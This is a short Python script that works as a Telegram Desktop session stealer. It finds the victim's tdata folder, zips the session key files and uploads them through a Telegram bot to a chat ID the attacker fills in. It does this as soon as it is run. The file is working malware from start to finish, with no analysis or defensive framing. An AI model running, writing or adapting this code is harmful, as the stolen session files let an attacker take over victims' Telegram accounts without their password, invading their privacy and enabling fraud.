import zipfile
import telebot
import os
bot=telebot.TeleBot("Your TOKEN")
Files = [
	'D877F783D5D3EF8Cs',
	'D877F783D5D3EF8C\\maps',
'key_datas']
# def send(message):
#     bot.send_message(message.chat.id,TelegramSession())

def Scan():
    tdata=os.path.join(os.getenv('AppData'),'Telegram Desktop\\tdata')
    return tdata
def TelegramSession(Directory='C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Telegram Desktop\\',TelegramDir=Scan()):
    if not  os.path.exists(TelegramDir):
        return None
    with zipfile.ZipFile(Directory+'tdata.zip','w',zipfile.ZIP_DEFLATED) as Archive:
        os.chdir(TelegramDir)
        for File in Files:
            if os.path.exists(File):
                Archive.write(File)
        file=open(Directory+'tdata.zip','rb')
        bot.send_document(Your_TELEGRMA_ID,file)
TelegramSession()
